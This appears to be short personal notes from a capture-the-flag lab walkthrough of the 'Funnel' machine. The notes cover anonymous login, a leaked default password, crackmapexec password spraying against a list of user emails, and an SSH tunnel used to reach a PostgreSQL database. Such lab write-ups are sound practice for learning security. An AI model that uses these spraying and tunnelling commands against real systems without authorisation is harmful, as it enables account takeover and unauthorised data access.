after scan we see anonymous login is enabled

logging in anonymously we find a document that displays the company rules for password creation

in the above file the default password is funnel123#!#

we also found a file containing email addresses optimus@funnel.htb albert@funnel.htb andreas@funnel.htb christine@funnel.htb maria@funnel.htb

now to password spray the default password to the rest of the emails ill use :
	-> crackmapexec smb <ip> -u users.txt -p passwords.txt
	
	
After running the password spray we found a hit :
└─$ crackmapexec ssh 10.129.229.194 -u users.txt -p passwords.txt
SSH         10.129.229.194  22     10.129.229.194   [+] christine:funnel123#!#

after logging in to christine we find a postgresql database with the command ss ls
	-> attempt to use this to open a port to the postgresql db 
		->ssh -p 7822 username@example.com -L 5432:localhost:5432 	
		-> after creating the tunnel , connect to the DB via -> psql -U christine -h localhost -p 5432
